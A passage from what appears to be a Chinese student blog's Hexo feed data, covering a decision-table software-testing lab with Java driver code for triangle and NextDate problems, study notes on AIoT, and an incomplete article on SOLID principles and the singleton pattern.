Y2}中之一</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td>…</td></tr><tr><td>A1：不可能</td><td></td><td></td><td></td><td></td><td>1</td><td></td><td></td><td></td><td></td></tr><tr><td>A2：日增1</td><td>1</td><td>1</td><td>1</td><td></td><td></td><td>1</td><td>1</td><td>1</td><td></td></tr><tr><td>A3：日复位</td><td></td><td></td><td></td><td>1</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>A4：月增1</td><td></td><td></td><td></td><td>1</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>A5：月复位</td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>A6：年增1</td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td></tr></tbody></table><p>6.得出测试用例</p><table><thead><tr><th>用例ID</th><th>月份</th><th>日期</th><th>年份</th><th>预计输出</th></tr></thead><tbody><tr><td>1-3</td><td>4</td><td>12</td><td>2001</td><td>2001年4月12日</td></tr><tr><td>4</td><td>4</td><td>30</td><td>2001</td><td>2001年5月1日</td></tr><tr><td>5</td><td>4</td><td>31</td><td>2001</td><td>不可能</td></tr><tr><td>6-9</td><td>1</td><td>15</td><td>2001</td><td>2001年1月16日</td></tr><tr><td>10</td><td>1</td><td>31</td><td>2001</td><td>2001年2月1日</td></tr><tr><td>11-14</td><td>12</td><td>15</td><td>2001</td><td>2001年12月16日</td></tr><tr><td>15</td><td>12</td><td>31</td><td>2001</td><td>2002年1月1日</td></tr><tr><td>16</td><td>2</td><td>15</td><td>2001</td><td>2001年2月16日</td></tr><tr><td>17</td><td>2</td><td>31</td><td>2004</td><td>2004年2月29日</td></tr><tr><td>…</td><td>…</td><td>…</td><td>…</td><td>…</td></tr></tbody></table><h2 id="测试代码及结果分析"><a href="#测试代码及结果分析" class="headerlink" title="测试代码及结果分析"></a>测试代码及结果分析</h2><h3 id="三角形问题：测试代码"><a href="#三角形问题：测试代码" class="headerlink" title="三角形问题：测试代码"></a>三角形问题：测试代码</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> exps;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> procs.TriangleProc;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TriangleTesting_third</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">checkShape</span><span class="params">(<span class="keyword">int</span> sideA, <span class="keyword">int</span> sideB, <span class="keyword">int</span> sideC)</span> </span>&#123;</span><br><span class="line">        TriangleProc triangleProc = <span class="keyword">new</span> TriangleProc();</span><br><span class="line"></span><br><span class="line">        triangleProc.sideA = sideA;</span><br><span class="line">        triangleProc.sideB = sideB;</span><br><span class="line">        triangleProc.sideC = sideC;</span><br><span class="line"></span><br><span class="line">        triangleProc.verifyLengthRange(triangleProc.sideA);</span><br><span class="line">        triangleProc.verifyLengthRange(triangleProc.sideB);</span><br><span class="line">        triangleProc.verifyLengthRange(triangleProc.sideC);</span><br><span class="line"></span><br><span class="line">        triangleProc.verifyFormPrinciple(triangleProc);</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">"三角形类型为："</span> + triangleProc.judgeTriangleType(triangleProc));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        TriangleTesting_third triangleTesting_third = <span class="keyword">new</span> TriangleTesting_third();</span><br><span class="line"></span><br><span class="line">        triangleTesting_third.checkShape(<span class="number">5</span>, <span class="number">2</span>, <span class="number">3</span>);</span><br><span class="line">        triangleTesting_third.checkShape(<span class="number">2</span>, <span class="number">5</span>, <span class="number">3</span>);</span><br><span class="line">        triangleTesting_third.checkShape(<span class="number">2</span>, <span class="number">3</span>, <span class="number">5</span>);</span><br><span class="line">        triangleTesting_third.checkShape(<span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>);</span><br><span class="line">        triangleTesting_third.checkShape(<span class="number">3</span>, <span class="number">3</span>, <span class="number">4</span>);</span><br><span class="line">        System.out.println(<span class="string">"=====不可能====="</span>);</span><br><span class="line">        System.out.println(<span class="string">"=====不可能====="</span>);</span><br><span class="line">        System.out.println(<span class="string">"=====不可能====="</span>);</span><br><span class="line">        triangleTesting_third.checkShape(<span class="number">3</span>, <span class="number">4</span>, <span class="number">3</span>);</span><br><span class="line">        triangleTesting_third.checkShape(<span class="number">4</span>, <span class="number">3</span>, <span class="number">3</span>);</span><br><span class="line">        triangleTesting_third.checkShape(<span class="number">3</span>, <span class="number">3</span>, <span class="number">3</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="三角形问题：测试结果"><a href="#三角形问题：测试结果" class="headerlink" title="三角形问题：测试结果"></a>三角形问题：测试结果</h3><img src="https://image-host-toky.oss-cn-shanghai.aliyuncs.com/20191229102623.png" style="zoom:50%;" />符合实验预期<h3 id="NextDate：测试代码"><a href="#NextDate：测试代码" class="headerlink" title="NextDate：测试代码"></a>NextDate：测试代码</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> exps;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> procs.NextDate;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">NextDateTesting_third</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 驱动模块</span></span><br><span class="line"><span class="comment">     * 函数：dateCheckFunction</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> nextDate</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">dateCheckFunction</span><span class="params">(NextDate nextDate, <span class="keyword">int</span> year, <span class="keyword">int</span> month, <span class="keyword">int</span> day)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">boolean</span> flag = <span class="keyword">true</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (year &gt;= <span class="number">1912</span> &amp;&amp; year &lt;= <span class="number">2050</span>) &#123;</span><br><span class="line">            nextDate.year = year;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            System.out.println(<span class="string">"The YEAR is out of range"</span>);</span><br><span class="line">            flag = <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (month &gt;= <span class="number">1</span> &amp;&amp; month &lt;= <span class="number">12</span>) &#123;</span><br><span class="line">            nextDate.month = month;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            System.out.println(<span class="string">"The MONTH is out of range"</span>);</span><br><span class="line">            flag = <span class="keyword">false</span>;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (day &gt;= <span class="number">1</span> &amp;&amp; day &lt;= <span class="number">31</span>) &#123;</span><br><span class="line">            nextDate.day = day;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            System.out.println(<span class="string">"The DAY is out of range"</span>);</span><br><span class="line">            flag = <span class="keyword">false</span>;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> flag;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">checkNextDate</span><span class="params">(<span class="keyword">int</span> year, <span class="keyword">int</span> month, <span class="keyword">int</span> day)</span> </span>&#123;</span><br><span class="line">        NextDate nextDate = <span class="keyword">new</span> NextDate();</span><br><span class="line">        NextDateTesting_two nextDateTesting_two = <span class="keyword">new</span> NextDateTesting_two();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 检查输入的日期是否符合要求</span></span><br><span class="line">        <span class="keyword">if</span> (nextDateTesting_two.dateCheckFunction(nextDate, year, month, day)) &#123;</span><br><span class="line">            <span class="comment">// 根据nextDateFunction函数获取后一天的日期</span></span><br><span class="line">            String dayAfter = nextDate.nextDateFunction(nextDate.year,</span><br><span class="line">                    nextDate.month, nextDate.day);</span><br><span class="line"></span><br><span class="line">            System.out.println(<span class="string">"The day after is "</span> + dayAfter);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        NextDateTesting_third nextDateTesting_third = <span class="keyword">new</span> NextDateTesting_third();</span><br><span class="line"></span><br><span class="line">        nextDateTesting_third.checkNextDate(<span class="number">2001</span>, <span class="number">4</span>, <span class="number">12</span>);</span><br><span class="line">        nextDateTesting_third.checkNextDate(<span class="number">2001</span>, <span class="number">4</span>, <span class="number">30</span>);</span><br><span class="line">        System.out.println(<span class="string">"将超出的日期当作下月的日期增位"</span>);</span><br><span class="line">        nextDateTesting_third.checkNextDate(<span class="number">2001</span>, <span class="number">4</span>, <span class="number">31</span>);</span><br><span class="line">        nextDateTesting_third.checkNextDate(<span class="number">2001</span>, <span class="number">1</span>, <span class="number">15</span>);</span><br><span class="line">        nextDateTesting_third.checkNextDate(<span class="number">2001</span>, <span class="number">1</span>, <span class="number">31</span>);</span><br><span class="line">        nextDateTesting_third.checkNextDate(<span class="number">2001</span>, <span class="number">12</span>, <span class="number">15</span>);</span><br><span class="line">        nextDateTesting_third.checkNextDate(<span class="number">2001</span>, <span class="number">2</span>, <span class="number">15</span>);</span><br><span class="line">        nextDateTesting_third.checkNextDate(<span class="number">2004</span>, <span class="number">2</span>, <span class="number">31</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="NextDate：测试结果"><a href="#NextDate：测试结果" class="headerlink" title="NextDate：测试结果"></a>NextDate：测试结果</h3><img src="https://image-host-toky.oss-cn-shanghai.aliyuncs.com/20191229103451.png" style="zoom:50%;" />以上是测试结果，符合实验预期<h2 id="实验总结"><a href="#实验总结" class="headerlink" title="实验总结"></a>实验总结</h2><h3 id="基于决策表的黑盒测试一般测试步骤"><a href="#基于决策表的黑盒测试一般测试步骤" class="headerlink" title="基于决策表的黑盒测试一般测试步骤"></a>基于决策表的黑盒测试一般测试步骤</h3><ol><li>列出所有的条件桩和动作桩</li><li>确定规则的个数</li><li>填入条件项（有限条件决策表/扩展条目决策表）</li><li>填入动作项</li><li>合并相似规则（不是必须的）</li><li>得到测试用例</li></ol><h3 id="决策表的适用范围"><a href="#决策表的适用范围" class="headerlink" title="决策表的适用范围"></a>决策表的适用范围</h3><p>通常适用于要产生大量决策的情况，或者输入变量之间存在重要逻辑关系。</p><p>1.决策表测试法适用于具有以下特征的应用程序</p><ul><li>程序的 if then else 逻辑突出</li><li>输入变量之间存在逻辑关系</li><li>计算过程涉及输入变量子集的处理</li><li>输入与输出之间存在因果关系</li><li>圈复杂度较高的应用</li></ul><p>2.适用于使用决策表设计测试用例的条件</p><ul><li>规格说明以决策表形式给出，或较容易转换为决策表</li><li>条件的排列顺序不会也不应影响执行的操作</li><li>规则的排列顺序不会也不应影响执行的操作</li><li>当某一规则的条件已经满足，并确定要执行的操作后，不必检验别的规则</li><li>如果某一规则的条件要执行多个操作，这些操作的执行顺序无关紧要</li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> 软件工程 </tag>
            
            <tag> 软件测试 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Artificial Intelligence of Things (AIoT)</title>
      <link href="/2019/12/27//articles/2019/12/27/1577433325914.html/"/>
      <url>/2019/12/27//articles/2019/12/27/1577433325914.html/</url>
      
        <content type="html"><![CDATA[<h1 id="Artificial-Intelligence-of-Things-AIoT"><a href="#Artificial-Intelligence-of-Things-AIoT" class="headerlink" title="Artificial Intelligence of Things (AIoT)"></a>Artificial Intelligence of Things (AIoT)</h1><h2 id="The-Ouline"><a href="#The-Ouline" class="headerlink" title="The Ouline"></a>The Ouline</h2><img src="https://image-host-toky.oss-cn-shanghai.aliyuncs.com/20191227154047.png" style="zoom: 50%;" /><h2 id="What’s-AIoT"><a href="#What’s-AIoT" class="headerlink" title="What’s AIoT?"></a>What’s AIoT?</h2><p>AIoT（人工智能物联网）=AI（人工智能）+IoT（物联网）<br>The Artificial Intelligence of Things (AIoT) is the combination of artificial intelligence (AI) technologies with the Internet of Things (IoT) infrastructure to achieve more efficient IoT operations, improve human-machine interactions and enhance data management and analytics.</p><h2 id="AIoT-Hardware-Architecture"><a href="#AIoT-Hardware-Architecture" class="headerlink" title="AIoT Hardware Architecture"></a>AIoT Hardware Architecture</h2><img src="https://image-host-toky.oss-cn-shanghai.aliyuncs.com/Screen Shot 2019-12-27 at 10.27.03 AM.png" style="zoom:33%;" />  This is the  architecture of AIoT hardware. Here is a example of the specific equipment:  <h3 id="SI-61S-AI-Industrial-AI-Computer"><a href="#SI-61S-AI-Industrial-AI-Computer" class="headerlink" title="SI-61S-AI Industrial AI Computer"></a>SI-61S-AI Industrial AI Computer</h3><p>The SI-61S-AI is a highly scalable player with an <strong>artificial intelligence calculation analysis</strong> system developed for <strong>multi-screen video wall applications</strong>.<br>It is equipped with Intel’s latest 7th generation desktop processor and supports multiple players via one Matrox or AMD PCI-E (x8) graphics card, and perform artificial intelligence analysis through another NVIDIA GPU card for AI analysis.<br><strong>High recognition rate</strong> from AI analysis will provide on-site personnel with accurate data for better management and judgment.  </p><img src="https://image-host-toky.oss-cn-shanghai.aliyuncs.com/20191227103414.png" style="zoom: 67%;" /><h2 id="IoT-and-Data"><a href="#IoT-and-Data" class="headerlink" title="IoT and Data"></a>IoT and Data</h2><ul><li>Extension of IoT Applications(Consumer, industries, smart home, etc.)</li><li>Data Explosion(爆炸)</li><li>Artificial Intelligence of Things(IoT —&gt; Big Data —&gt; AI )<br><img src="https://image-host-toky.oss-cn-shanghai.aliyuncs.com/20191227140121.png"></li></ul><h2 id="Data-driven-AIoT"><a href="#Data-driven-AIoT" class="headerlink" title="Data-driven AIoT"></a>Data-driven AIoT</h2><ul><li>Data Sources</li><li>Data Processing and management</li><li>Application-based analytics</li><li>Application &amp; sources</li></ul><h2 id="Data-Processing-and-management"><a href="#Data-Processing-and-management" class="headerlink" title="Data Processing and management"></a>Data Processing and management</h2><h3 id="1-Data-Collection"><a href="#1-Data-Collection" class="headerlink" title="1. Data Collection"></a>1. Data Collection</h3><ul><li>Filtering</li><li>Pre-processing</li><li>Storing</li><li>Ingestion(摄取)</li></ul><h3 id="2-1-Data-Discovery"><a href="#2-1-Data-Discovery" class="headerlink" title="2.1 Data Discovery"></a>2.1 Data Discovery</h3><ul><li>Data Fusion（数据融合，集成多个数据源）</li><li>Enrichment（使用模糊逻辑辅助搜索；获得相关的源地址信息；纠正拼写错误等）</li><li>Modeling（建模）</li><li>Indexing（标引）</li><li>Annotation（标注）</li></ul><h3 id="2-2-Data-Analytics"><a href="#2-2-Data-Analytics" class="headerlink" title="2.2 Data Analytics"></a>2.2 Data Analytics</h3><ul><li>Data Semantic（数据语义）</li><li>Meta-data Management（元数据管理）</li><li>Reasoning Contextual Data（上下文数据推理）</li></ul><h3 id="3-Data-Protection"><a href="#3-Data-Protection" class="headerlink" title="3. Data Protection"></a>3. Data Protection</h3><ul><li>Anonymize（匿名化）</li><li>Data Masking（数据屏蔽，创建结构相似但不真实的数据版本，用以保护实际数据）</li><li>Data Transformation（数据转换，从一种格式或结构转换为另一种格式或结构的过程）</li><li>Sharing Control（共享控制）</li></ul><p>###4.  Data Publication</p><ul><li>Publication（发表）</li><li>Open Data Sharing（开放的共享控制）</li><li>Personal Data Sharing（个人数据共享）</li><li>Visualization and Report（可视化报告）</li></ul><h2 id="AI-Based-Deep-Analysis"><a href="#AI-Based-Deep-Analysis" class="headerlink" title="AI-Based Deep Analysis"></a>AI-Based Deep Analysis</h2><h3 id="Decision-Management（决策管理）"><a href="#Decision-Management（决策管理）" class="headerlink" title="Decision Management（决策管理）"></a>Decision Management（决策管理）</h3><h3 id="Discovery-and-Exploration（发现和探索）"><a href="#Discovery-and-Exploration（发现和探索）" class="headerlink" title="Discovery and Exploration（发现和探索）"></a>Discovery and Exploration（发现和探索）</h3><h3 id="Reporting-and-Analytics（报告和分析）"><a href="#Reporting-and-Analytics（报告和分析）" class="headerlink" title="Reporting and Analytics（报告和分析）"></a>Reporting and Analytics（报告和分析）</h3><h3 id="Predictive-Analytics（预测分析）and-Modelling"><a href="#Predictive-Analytics（预测分析）and-Modelling" class="headerlink" title="Predictive Analytics（预测分析）and Modelling"></a>Predictive Analytics（预测分析）and Modelling</h3><img src="https://image-host-toky.oss-cn-shanghai.aliyuncs.com/20191227145728.png" style="zoom: 33%;" /><h2 id="AI-algorithms-used-in-the-field-of-data-analysis"><a href="#AI-algorithms-used-in-the-field-of-data-analysis" class="headerlink" title="AI algorithms used in the field of data analysis"></a>AI algorithms used in the field of data analysis</h2><ul><li><p>Linear regression（线性回归）<br>举例：y = B0 + B1 * x  给定输入x，我们将预测y，线性回归学习算法的目标是找到系数B0和B1的值</p></li><li><p>Logistic Regression（逻辑回归）<br>The prediction of the output is worth transforming using nonlinear functions called logical functions</p></li><li><p>Bayes Theorem（朴素贝叶斯）</p></li><li><p>KNN</p></li><li><p>Support Vector Machine</p></li><li><p>Random Forest</p></li><li><p>…</p></li></ul><h2 id="Trustworthiness-in-AIoT"><a href="#Trustworthiness-in-AIoT" class="headerlink" title="Trustworthiness in AIoT"></a>Trustworthiness in AIoT</h2><p>// TODO，此处关于区块链，后续文章补充</p><h2 id="Secure-Decentralized-Artificial-Intelligence-of-Things-AI-Blockchain-IoT"><a href="#Secure-Decentralized-Artificial-Intelligence-of-Things-AI-Blockchain-IoT" class="headerlink" title="Secure Decentralized Artificial Intelligence of Things (AI + Blockchain + IoT)"></a>Secure Decentralized Artificial Intelligence of Things (AI + Blockchain + IoT)</h2><p>![](<a href="https://image-host-toky.oss-cn-shanghai.aliyuncs.com/Screen" target="_blank" rel="noopener">https://image-host-toky.oss-cn-shanghai.aliyuncs.com/Screen</a> Shot 2019-12-27 at 10.47.00 AM.png)</p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p>[1] <a href="https://www.businesswire.com/news/home/20191203005602/en/Global-Artificial-Intelligence-IoT-AIoT-Convergence-Market" target="_blank" rel="noopener">https://www.businesswire.com/news/home/20191203005602/en/Global-Artificial-Intelligence-IoT-AIoT-Convergence-Market</a>   </p><p>[2] <a href="https://www.roboticschina.com/news/2348.html" target="_blank" rel="noopener">https://www.roboticschina.com/news/2348.html</a></p><p>[3] <a href="https://ieeexplore.ieee.org/document/8603082" target="_blank" rel="noopener">https://ieeexplore.ieee.org/document/8603082</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> ML&amp;AI </tag>
            
            <tag> Note </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>设计模式及原则</title>
      <link href="/2019/12/27/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F%E5%8F%8A%E5%8E%9F%E5%88%99/"/>
      <url>/2019/12/27/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F%E5%8F%8A%E5%8E%9F%E5%88%99/</url>
      
        <content type="html"><![CDATA[<h1 id="设计模式及原则"><a href="#设计模式及原则" class="headerlink" title="设计模式及原则"></a>设计模式及原则</h1><h2 id="设计模式"><a href="#设计模式" class="headerlink" title="设计模式"></a>设计模式</h2><h3 id="什么是设计模式？"><a href="#什么是设计模式？" class="headerlink" title="什么是设计模式？"></a>什么是设计模式？</h3><p>设计模式是可以应用于<strong>常见问题的通用可重用解决方案</strong>。<br>创建软件应用程序是为了<strong>满足不断变化和发展的需求</strong>。一个成功的应用程序还应该提供一种简单的方法来扩展它以满足不断变化的期望。后面所讲的设计原则，以及后续所学习的设计模式都是为了这个目的：应用于常见问题的通用可重用解决，满足不断变化和发展的需求。</p><h2 id="面向对象的设计原则"><a href="#面向对象的设计原则" class="headerlink" title="面向对象的设计原则"></a>面向对象的设计原则</h2><p>面向对象的设计原则被称为SOLID。SOLID原则包括单一职责原则、开闭原则、里氏替换原则、接口隔离原则和依赖倒置原则。在设计和开发软件时可以应用这些原则，以便创建易于维护和开发的程序。</p><h3 id="单一职责原则"><a href="#单一职责原则" class="headerlink" title="单一职责原则"></a>单一职责原则</h3><p>该原则是指软件模块应该只有一个被修改的理由，目的是为了让封装工作达到最佳的状态。  </p><p>例如常用于Java中类的修改：修改某个类时，需要修改的原因不止一个，而且这个过程常常会影响其他类的修改。每个更改的职责/理由都会增加新的依赖关系，使代码不那么健壮。<br>e.g. 一个Car类，假设对Car类添加方法来处理增、删、改、查的数据库操作。此时Car不仅会封装逻辑，还会封装数据库操作。使得类的维护和测试更加困难，因为代码是紧密耦合的。<br><img src="https://image-host-toky.oss-cn-shanghai.aliyuncs.com/20191213134011.png" alt="没有遵循单一职责原则增加功能的Car类" style="zoom: 33%;" /><br>图：没有遵循单一职责原则增加功能的Car类<br>解决方案：创建两个类，一个用于封装Car逻辑(Car)，另一个用于负责持久性(CarDao)。<br><img src="https://image-host-toky.oss-cn-shanghai.aliyuncs.com/20191213134408.png" alt="逻辑封装与持久性分离" style="zoom:50%;" /><br>图：逻辑封装与持久性分离  </p><h3 id="开闭原则"><a href="#开闭原则" class="headerlink" title="开闭原则"></a>开闭原则</h3><p>“模块、类和函数应该对扩展开放，对修改关闭。”  </p><p>修改某个已完成部分分险和成本往往更大，我们应该在此基础上继续进行建设（通过继承和多态的方式），而不是去修改原本的。～是最重要的设计原则之一，是大多数设计模式的基础。</p><h3 id="里氏替换原则"><a href="#里氏替换原则" class="headerlink" title="里氏替换原则"></a>里氏替换原则</h3><p>派生类型必须完全可替代其基类型。基于面向对象语言中的<strong>子类型多态</strong>，派生对象可以用其父类型替换。<br>简单来说：当类B继承类A时，除添加新的方法完成新增功能P2外，尽量不要重写父类A的方法，也尽量不要重载父类A的方法。此时可以说，类B是类A比较完整的派生对象，父类型可以替换子类型的多态（不同类型实体接口相同）。  </p><h3 id="接口隔离原则"><a href="#接口隔离原则" class="headerlink" title="接口隔离原则"></a>接口隔离原则</h3><p>使用的接口方法满足客户端功能实现最低要求即可。即，“客户端不应该依赖于它所不需要的接口”。</p><h3 id="依赖倒置原则"><a href="#依赖倒置原则" class="headerlink" title="依赖倒置原则"></a>依赖倒置原则</h3><p>“高级模块不应该依赖低级模块，两者都应该依赖抽象。”<br>“抽象不应该依赖于细节，细节应该依赖于抽象。”</p><p>这个原则的目的就是为了降低耦合，常用的方法是将高级逻辑与低级模块分开。可以尝试让它们都<strong>依赖于抽象进而减少二者之间的依赖关系</strong>。如此就可以替换或扩展其中任何一个模块而不影响其他模块。</p><p>e.g. 以下的vehicle为抽象类<br><img src="https://image-host-toky.oss-cn-shanghai.aliyuncs.com/20191213143318.png" alt="依赖倒置原则的使用" style="zoom: 67%;" /><br>图：依赖倒置原则的使用  </p><h2 id="创建型模式（Creational-Pattern）"><a href="#创建型模式（Creational-Pattern）" class="headerlink" title="创建型模式（Creational Pattern）"></a>创建型模式（Creational Pattern）</h2><h3 id="单例模式"><a href="#单例模式" class="headerlink" title="单例模式"></a>单例模式</h3><h4 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h4><p>单例模式，故名思义是用来保证一个对象只能创建一个实例。单例模式是最简单也是最常用的一种设计模式，但因为过度使用或者在不恰当的时候使用，有的时候会被视为一种反模式。</p><h4 id="如何实现？"><a href="#如何实现？" class="headerlink" title="如何实现？"></a>如何实现？</h4><p>只由单个类组成。为确保单例实例的唯一性，所有的单例构造器都要被声明为私有的（private），再通过声明静态（static）方法实现全局访问获得该单例实例。</p><p>注意一下要点：</p><ol><li>单例构造器都要被声明为私有的（private）</li><li>通过申明静态方法全局访问获得该单例示例</li><li>自行向整个系统提供该实例<br><img src="https://image-host-toky.oss-cn-shanghai.aliyuncs.com/20191213205413.png" alt="单例模式实现示意图"><br>图：单例模式实现示意图</li></ol><h4 id="代码示例"><a href="#代码示例" class="headerlink" title="代码示例"></a>代码示例</h4><p>以下为一段使用Java实现的单例模式，注意，要点在代码注释中再次写明：<br>Singleton.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Singleton</span> </span>&#123;</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> Singleton instance;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 单例构造器都要被声明为私有的（private）</span></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="title">Singleton</span><span class="params">()</span> </span>&#123;</span><br><span class="line">System.out.println(<span class="string">"Singleton is Instantiated."</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Singleton <span class="title">getInstance</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="comment">// 注意，检查实例是否为空，如果不为空则表明对象在之前被创建过</span></span><br><span class="line"><span class="keyword">if</span> (instance == <span class="keyword">null</span>)</span><br><span class="line"><span class="comment">// 自行向整个系统提供该实例</span></span><br><span class="line">instance = <span class="keyword">new</span> Singleton();</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> instance;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">doSomething</span><span class="params">()</span> </span>&#123;</span><br><span class="line">System.out.println(<span class="string">"Something is Done."</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>MyMainClass.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span 